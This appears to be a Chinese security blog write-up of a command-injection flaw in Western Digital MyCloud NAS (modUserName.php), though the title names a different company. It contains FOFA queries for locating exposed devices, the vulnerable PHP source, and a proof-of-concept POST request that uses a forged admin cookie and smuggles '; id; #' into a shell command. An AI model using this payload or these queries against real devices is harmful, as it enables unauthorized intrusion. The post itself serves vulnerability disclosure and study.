---
title: "西部数码 NAS modUserName.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-modUserName-rce.html
asset_dir: assets/西部数码-nas-modusername.php-命令执行漏洞
---

# 西部数码 NAS modUserName.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/9 12:31
- 884浏览
- [2评论](#comment)
- 20分钟阅读

深入探索

鉴权

脚本

脚本语言

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS modUserName.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞预警服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

直接看 `modUserName.php` 其业务实现逻辑如下

```
<?
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() != 1)
{
    echo json_encode($r);
    exit;
}
if (isset($_POST['username']) && $_POST['username'] != "")
{
    $username = $_POST['username'];
    $oldName = $_POST['oldName'];
    $ip = $_SERVER['REMOTE_ADDR'];

    if (isset($_SESSION['username']))
    {
       $sname = $_SESSION['username'];
       $debugCmd="echo old:$sname >/tmp/debug";
       exec($debugCmd, $ret);

    unset($_SESSION['username']);
    $_SESSION['username'] = $username;

       $sname = $_SESSION['username'];
       $debugCmd="echo new:$sname >>/tmp/debug";
       exec($debugCmd, $ret);

    session_write_close();

       //echo $_SESSION['username'];
    }
    else
    {
       $debugCmd="echo 'no session' >>/tmp/debug";
       exec($debugCmd, $ret);
    }

    //wto delete 
    $cmd = "wto -n \"$oldName\" -d ";
    system($cmd,$retval);

    //wto add
    $cmd = "wto -n \"$username\" -i \"$ip\" -s";
    system($cmd,$retval);

    header("Status: 200");
}
?>
```

在处理管理员修改用户名的功能时，将用户提交的 `username` 和 `oldName` 参数未经任何过滤或转义，直接拼接到 `system()` 函数执行的系统命令中，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管需要管理员权限，但可以结合login\_check的权限绕过达到 [RCE](https://mrxn.net/tag/rce)的效果。

硬盘驱动器

# 漏洞复现

```
POST /web/php/modUserName.php HTTP/1.1
Host: west.nas.mrxn.net
Cookie: username=test; isAdmin=1
Content-Type: application/x-www-form-urlencoded

oldName=someuser&username=newuser"; id; #
```

[![西部数码 NAS modUserName.php 命令执行漏洞](images/img-001-c6c8a6404dee.webp)](https://image.mrxn.net/63b83ed095974f7e8744143940a76b33.webp)

成功[执行id命令](https://mrxn.net/tag/rce)并回显结果

数据备份与恢复

- 标签：
- [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKXUlEQVR4AeydgXbcuA5Dc/v//7wvMAOJtmiNJ0nH83bVUwYUAFKuaCVNs+fsn4+Pj39+Gv9881fe1y0y59zaI3zWP+vnXmd4rD3zPctrIJ816/e7nEAbyOfEP56Jq38A4APY2YGNy/vByO2KThYQdUB7/soK4au0zEH48rNl3TmEz+uMufZKnmvbQDK58vtOYBgIxOShxtmjQtRUHggNqORLHLDdLOh4qfCBCXo/v9G5xFyF2XfMofeFMT/6tR4GInLFfSewBnLf2Zc7/5WBQL+evuZ5d3PQfVk/y10nrDwQ/SrtKgdjD7jGXd1j5vsrA5ltuLT5CfzqQPTmKvKWML5d1uV1mKsQogd0tM/1QnMVSldkDaKfeEfWnVuD8MP8r9iu+w7+6kDaA6zk2yewBvLto/s7hcNAfD3P8MpjVLWP6lwD/dPCscYe4VE7W0P0q3T1UVQaRB3QZHkdwPY9UROLxN4zLEo+hoFUpsW97gTaQCAmDtewekSI2qxBcPktgeAe+ay7FqIO+hdVeI5zTyFErfJjeE8hnPuOdVpD+OEaqsbRBmJi4b0nsAZy7/kPu//RlfxpuKv7QL+q1jLOfNBrjz6vhe6n3GGuwspjDvqez9ba714/xXVDfKJvgtOBQH9zIHI/N8QaOlqrEEbfo7fJfeyDsYc9Ge0XQtRYh1hDR/kclW/GWXuE0PeDyKua6UCqghu5/8TWfyCmBYHVn9pvj9C68mNU2oyD2BOwbYp5v8oIDN+suQZC81roHhAa9L9OS3fYVyH0WjjP3Stj1W/dkOpUbuTWQG48/GrrNhBfpWyqOOtwfj3t+Q5C7+t6CM7rRwjhh46Pao46jLU+D6H9yo9hrUIY+2ZfG0gmV37fCbSBQJ8cRO7HglgDptp/A6W3w6RyBbB9cYX+RRI6Z3+FqndUujno/SDyWZ01CC/0Z3PPRwi9FiJ3DcQa6r4Qup9DCMG5h7ANRIsV95/AGsj9M9g9wXQgMF4pCA467jp+LnQdHRA+r4WfltPfEH6geVSjaMRJAmyfKk/kU1q9HTZ5LZxx1ipU7TEqH8RzA+sHVB8f7/VrekOO09Xaj6/8GNagT9we6BxEbk3o2goh/NDRPtUew1qF2Vvp5mDcCzrnPvZnhO6DyK1DrKH+4j8diJssfN0JrIG87qwv7TT8gKqqgvGaQecgctf6OgvNVQhRB1Ty9gUauqZ+jqoA2GrsEdoHocEc7a9Q/RzWIfp5ndFeIYRPuQOCyzXrhuTTeIO8DQRiWp6eEK5x/nNA+GFE9TuG676D7lXVQt/fvgpdmzWI2oqD0ACXNsx+58B2Y6F/AYfOudh+YRuIxYX3nsAayL3nP+w+HYiukALGawadk+csvCN0v7lcU3HWrUHvAWN+9LtOCOFX7rAfQoP+qcUeoX3KnwnXCV2n3GEu43Qg2bjyp07g2+bpQCDenNzd081oHcIPHbPPeeU3V6HrMlY+iH2zD4KzH2INHa0JIXjlDrjG2W+EqIMa7cs4HUg2rvw1JzAMBPo0/Qj5jTMH3QeRW6v81jJmH+x7yAfBQaA4h2u9foT2Z6xqrGdtxlmDeEboeLUH9JphILnJyl9/Amsgrz/z6Y5tIL56U/enCHG97M/4KW+/ITzQcRO+PkDwX8sN3GdbXPgA0cN1wgtlO4tqjgHRF0bcFX8tIHxfyw3cc1tMPkDU2i9sA5nULemFJ3DpPyXNz6MpKiCmCx3FK7LfOTzvc616KuD7PdwLeo8Zp/2OYb8Qoo894hyw1+SB4OwRildAaMD6Ee7Hm/1an7LefSC6Qg5jfmaI62UtI5xruccsz/2cw9jXPSA06P8O5bqMEL7MuUdG65mDqM2cfRCa10L7IDTAVImqcawbUh7RfWT7EW71CMD2A5aZBuEBKttWD7WWC4DNW3F+e7J2NYd9X4g1dMy9IPjMOfdzCI+c1z/FdUN+eoK/XL8G8ssH+tN27fsQN4K4soCp7VMJsKFJXduzsEdYeWDfS75ZQPiho/25vznovqwrt0eo9VlA7yGvAjoH57m8irPe5iF6yOtYN8Qn8SZ4aSCeaEaI6QLTPwqwu1kyuw+EBoh+GK4TAkPfWQMIv2odEFyug+DsOUPXWPf6DCH6VjqEBqzv1D/e7Ff7a+/VSfv57RdCnzDsc/thzwOWNlQfBbC9+cDG64N4hfJjAM0PkWcP7DmINdBsQOuhfRRNfJBA1FY2CA36N60wcrn20qesXPDzfHWYncAayOx0btDaQCCuUn4GXV0FhAY1ukZehdcZxc8ie53bD+O+1p5F9xa6VrkDxr1g5Ox3j4yVBtGj8tkvbAPRYsX9J9C+MfTkqkeyJrSu3GEOrr0FRz9gqkTvk9FGoH1BhsitPUIY/XmPY577WYPoAR2z75jD6HMv4bohxxO7eb0GcvMAjtu3gUBcJV0bx9Gc1xB+6H/Hzvoxh+635n2EFQdRYw1iDR2tZYRRh+C01yxyn1kOj/tV9XlviB7Z1waSyZXfdwJtIJ4cxNSA9lRA+8JpX0YI3QUQa+i3J/srn7mrmPs5r2ohnsUeiDVQ2RsHtD+zSffIaK1CGHvAyOXaNpBM/j/m/5ZnXgN5s0m2gUBcpUfPB+GDjrMa6D7Y57kO9hr0T3f25U8VMPrtqxDCn3vMfFmDqIVzrPx5r1kOvW8bSG648vtOYBhInqQfK3NVbp8xe8xltF5x1oTWob9BELl0hT0ZxTvMew1RDzUe/a4TWhNqnQN6P/PyHQO6DyK3XzgM5NhgrV97Amsgrz3vh7sNA4G4RnAdj7tAr9U1PAaEnnkILveCPZf99mXOuTWhOdj3ypo9QvEKCD+g5RbSHUD7PgXYdH8Adhr0tT0ZoevDQLJx5a8/geFn6n4DvoN+/FxrLqP1zDmH/rYcfdC1yj/j3Csj9H4QedadQ2jun9GeCrPPeeXL3LohPqkSX0+2H1BBvAXwPF55bOh97YeRy28LhG7OdWcI4c86BAeBWav6Qvigo2tg5K5o9gjhvIf0dUN0Cm8UayBvNAw9ShuIr+9VVPExXAv9WkLk1oQwcu4FoUH/tywIzp6M6neMrM9yiL7Heq1zndaKzB1z6Y6jltf2CDPvvA3ExMJ7T2AYCMRbAzXOHheiRtM/BoQG/c3PvezPHERNpdkH4YGO1oSuNYqbBUSf7IGRsw6hwYj2PIPDQJ4pXt7fP4E1kN8/0x91/CsDgfH6+lOG8NknhuiX6yA49XNY91poDsIPHaUrYORcJ5TnmVCNoqoR74C+L0T+VwbiDRfWJzBjf3UgfiNmG0qDeBuUOyA498hoT8VB1AG27f6ltZFfSdXjS9oA2OqzD4KDjpv58wME95kOvyE0qHEo+CR+dSCf/dbvH57AGsgPD/C3y4eB5Kta5Vce4FGd9Su95LEf+tU3l1Hes7APeg97rWW0lrHSzVW+zFV5VTsMpCpc3OtOoA0E+psDj/PZI0Kvr3wQetaqtwX2PnuEroXwAKbK/6UfMHyxdgGEBpjaofZTZBLY+sGI2edc9ceotDYQiwvvPYE1kHvPf9j9fwAAAP//+/boGwAAAAZJREFUAwBqHBiAmGY9ZAAAAABJRU5ErkJggg==)

手机扫码阅读
